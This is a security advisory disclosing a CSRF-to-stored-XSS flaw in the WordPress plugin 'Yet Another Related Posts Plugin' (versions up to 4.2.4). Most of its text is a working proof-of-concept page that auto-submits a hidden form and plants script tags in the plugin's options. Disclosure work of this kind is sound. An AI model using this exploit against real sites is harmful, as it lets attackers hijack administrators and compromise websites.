@@ -1,0 +1,69 @@
+Homepage
+https://wordpress.org/plugins/yet-another-related-posts-plugin/
+Affected Versions <= 4.2.4 Description 'Yet Another Related Posts Plugin'
+options can be updated with no token/nonce protection which an attacker may
+exploit via tricking website's administrator to enter a malformed page
+which will change YARPP options, and since some options allow html the
+attacker is able to inject malformed javascript code which can lead to *code
+execution/administrator actions* when the injected code is triggered by an
+admin user.
+injected javascript code is triggered on any post page. Vulnerability Scope
+XSS
+RCE ( http://research.evex.pw/?vuln=14 ) Authorization Required None Proof
+of Concept
+
+<body onload="document.getElementById('payload_form').submit()" >
+  <form id="payload_form"
+action="http://wpsite.com/wp-admin/options-general.php?page=yarpp"
+method="POST" >
+    <input type='hidden' name='recent_number' value='12' >
+    <input type='hidden' name='recent_units' value='month' >
+    <input type='hidden' name='threshold' value='5' >
+    <input type='hidden' name='weight[title]' value='no' >
+    <input type='hidden' name='weight[body]' value='no' >
+    <input type='hidden' name='tax[category]' value='no' >
+    <input type='hidden' name='tax[post_tag]' value='consider' >
+    <input type='hidden' name='auto_display_post_types[post]' value='on' >
+    <input type='hidden' name='auto_display_post_types[page]' value='on' >
+    <input type='hidden' name='auto_display_post_types[attachment]' value='on' >
+    <input type='hidden' name='auto_display_archive' value='true' >
+    <input type='hidden' name='limit' value='1' >
+    <input type='hidden' name='use_template' value='builtin' >
+    <input type='hidden' name='thumbnails_heading' value='Related posts:' >
+    <input type='hidden' name='no_results' value='<script>alert(1);</script>' >
+    <input type='hidden' name='before_related'
+value='<script>alert(1);</script><li>' >
+    <input type='hidden' name='after_related' value='</li>' >
+    <input type='hidden' name='before_title'
+value='<script>alert(1);</script><li>' >
+    <input type='hidden' name='after_title' value='</li>' >
+    <input type='hidden' name='show_excerpt' value='true' >
+    <input type='hidden' name='excerpt_length' value='10' >
+    <input type='hidden' name='before_post' value='+<small>' >
+    <input type='hidden' name='after_post' value='</small>' >
+    <input type='hidden' name='order' value='post_date ASC' >
+    <input type='hidden' name='promote_yarpp' value='true' >
+    <input type='hidden' name='rss_display' value='true' >
+    <input type='hidden' name='rss_limit' value='1' >
+    <input type='hidden' name='rss_use_template' value='builtin' >
+    <input type='hidden' name='rss_thumbnails_heading' value='Related posts:' >
+    <input type='hidden' name='rss_no_results' value='No Results' >
+    <input type='hidden' name='rss_before_related' value='<li>' >
+    <input type='hidden' name='rss_after_related' value='</li>' >
+    <input type='hidden' name='rss_before_title' value='<li>' >
+    <input type='hidden' name='rss_after_title' value='</li>' >
+    <input type='hidden' name='rss_show_excerpt' value='true' >
+    <input type='hidden' name='rss_excerpt_length' value='10' >
+    <input type='hidden' name='rss_before_post' value='+<small>' >
+    <input type='hidden' name='rss_after_post' value='</small>' >
+    <input type='hidden' name='rss_order' value='score DESC' >
+    <input type='hidden' name='rss_promote_yarpp' value='true' >
+    <input type='hidden' name='update_yarpp' value='Save Changes' >
+  </form></body>
+
+Fix No Fix Available at The Moment. Timeline Notified Vendor - No Reply
+Notified Vendor Again- No Reply
+Publish Disclosure
+
+@Evex_1337
+http://research.evex.pw/?vuln=15
